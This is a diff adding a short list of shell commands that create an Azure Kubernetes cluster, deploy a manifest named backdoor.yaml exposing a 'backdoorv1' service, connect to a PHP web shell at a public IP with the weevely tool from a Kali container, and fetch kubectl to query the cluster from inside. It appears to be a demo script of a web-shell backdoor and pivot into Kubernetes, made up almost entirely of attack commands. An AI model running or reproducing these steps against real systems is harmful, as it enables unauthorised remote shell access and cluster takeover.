@@ -1,0 +1,17 @@
+az login
+az account set --subscription 91b61812-5f03-46a9-a25e-c31eaf0c81fe
+az group create --name myResourceGroup --location eastus
+az aks create --resource-group myResourceGroup --name myAKSCluster --node-count 2 --generate-ssh-keys
+az aks install-cli
+az aks get-credentials --resource-group myResourceGroup --name myAKSCluster
+
+kubectl get nodes
+vi backdoor.yaml
+kubectl create -f backdoor.yaml
+
+kubectl get service backdoorv1 --watch
+
+docker run -it c4nc/kalibase weevely http://52.234.210.233/demo.php demo
+curl -LO https://storage.googleapis.com/kubernetes-release/release/v1.9.0/bin/linux/amd64/kubectl
+chmod +x ./kubectl
+./kubectl get nodes
